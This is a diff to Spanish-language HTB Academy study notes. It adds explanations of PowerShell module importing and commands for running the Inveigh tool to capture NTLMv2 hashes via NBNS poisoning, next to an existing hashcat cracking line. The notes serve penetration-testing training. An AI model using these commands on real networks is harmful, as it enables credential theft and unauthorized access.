@@ -273,12 +273,49 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
  ![image](https://github.com/gecr07/HTB-Academy/assets/63270579/70321032-fae0-4b0c-b869-4ab1cd955e06)
 
 
+## Powershell modulos ( Como funciona )
+
+En PowerShell, puedes ver los módulos disponibles para importar utilizando el cmdlet Get-Module. Este cmdlet te mostrará una lista de módulos que están actualmente instalados en tu sistema y que están disponibles para su importación. Aquí tienes algunos ejemplos de cómo usarlo:
+
+```
+Get-Module -ListAvailable # Para ver una lista de todos los módulos disponibles en tu sistema
+Get-Module # Para ver solo los módulos que están actualmente cargados en tu sesión de PowerShell 
+```
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/42487519-9366-438c-b573-3b41a6e330df)
 
 
+Para listar todos los módulos disponibles en todas las ubicaciones especificadas en la variable de entorno $env:PSModulePath, puedes utilizar un bucle para recorrer cada ubicación y luego usar el cmdlet Get-Module para obtener los módulos en cada una de ellas. Aquí tienes un script que realiza esta tarea:
 
+### Tenemos de dos
 
+Para agregar un modulo lo descargas y lo pones en alguna ruta de las que aparece en la variable de entorno. Y la segunda es ponerte en la carpeta donde esta el modulo .ps1 o .psm1.
 
+```
+Import-Module .\Inveigh.ps1
+(Get-Command Invoke-Inveigh).Parameters
+```
 
+## C# Inveigh (InveighZero)
+
+Aqui tiene 2 una version de ps que ya no se actualiza y la de C#
+
+```
+PS C:\htb> Import-Module .\Inveigh.ps1
+PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+
+Y la version exe es:
+
+```
+.\Inveigh.exe
+ESC ( entras en console mode)
+GET NTLMV2UNIQUE
+GET NTLMV2USERNAMES
+```
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/16bf2f6f-f330-4067-9bd7-30a496dea990)
 
 
 
